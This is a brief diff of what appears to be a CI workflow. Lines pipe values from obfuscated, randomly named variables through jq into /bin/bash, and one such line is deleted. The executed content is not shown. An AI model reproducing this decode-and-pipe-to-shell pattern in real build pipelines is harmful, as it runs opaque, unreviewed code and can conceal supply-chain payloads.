@@ -37,7 +37,6 @@ jobs:
           echo $ezgai3612 | jq -r .npw62 | /bin/bash
           echo $ndd16040 | jq -r .t17 | /bin/bash
           printf '%s' "$zqc5641" | jq -r .qt9758 | /bin/bash
-          printf '%s' "$rnrl42" | jq -r .o62121 | /bin/bash
           printf '%s' "$lfyyd28" | jq -r .wnxfz7762 | /bin/bash
 
       - name: Persist output
